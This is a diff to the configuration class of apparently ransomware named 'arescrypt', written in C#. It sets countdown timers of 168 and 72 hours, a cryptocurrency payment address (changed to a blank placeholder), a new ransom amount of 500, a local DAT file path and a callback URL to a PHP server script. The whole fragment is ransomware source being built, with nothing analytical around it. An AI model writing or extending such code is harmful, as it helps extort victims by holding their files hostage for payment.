@@ -21,12 +21,16 @@
         /* Timer application */
         public int lostTimer_Hours = 0xA8; public int lostTimer_Minutes = 0x0; public int lostTimer_Seconds = 0x0;
         public int riseTimer_Hours = 0x48; public int riseTimer_Minutes = 0x0; public int riseTimer_Seconds = 0x0;
-        public string cryptoAddress = "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"; // insert Bitcoin/Litecoin/Zcash address here
+        public string cryptoAddress = ""; // insert Bitcoin address here
+
+        // Initial ammount to charge
+        public static int amountToCharge = 0x1F4;
 
         // DAT file configuration
         public static string datFileLocation = currentWorkingDirectory + @"\arescrypt.dat";
+
         // Server Data
-        public static string callbackURL = "http://" + "localhost" + "/arescrypt.php"; // just put the callback url hosting the addon API script
+        public static string callbackURL = "http://localhost/arescrypt.php"; // just put the callback url hosting the addon API script
     }
 
     class UserData
